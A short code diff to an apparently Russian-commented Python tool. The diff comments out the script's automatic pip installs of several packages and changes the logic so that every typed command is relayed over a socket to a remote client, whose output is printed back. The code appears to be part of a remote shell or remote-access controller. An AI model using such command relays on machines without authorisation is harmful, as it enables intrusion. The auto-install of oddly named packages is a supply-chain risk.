@@ -1,9 +1,11 @@
 try:
     from os import system
-    system("pip install subprocess")
+    """system("pip install subprocess")
+    system("pip install easyocr")
     system("pip install sockets")
+    system("pip install opencv-python")
     system("pip install pypi-stat")
-    system("pip install comtypes")
+    system("pip install comtypes")"""
     # Добавляем необходимые подклассы - MIME-типы
     import subprocess
     import os.path
@@ -272,7 +274,7 @@ try:
                 client.send(command.split(" ")[0].encode("cp65001"))
             elif "abbort" == command:
                 exit(1)
-            elif "cd" not in command and command != "":
+            else:
                 client.send(command.encode("cp65001"))
                 result_output = client.recv(4096).decode("cp65001").split("╨Т┬а")
                 print(" ".join(result_output))
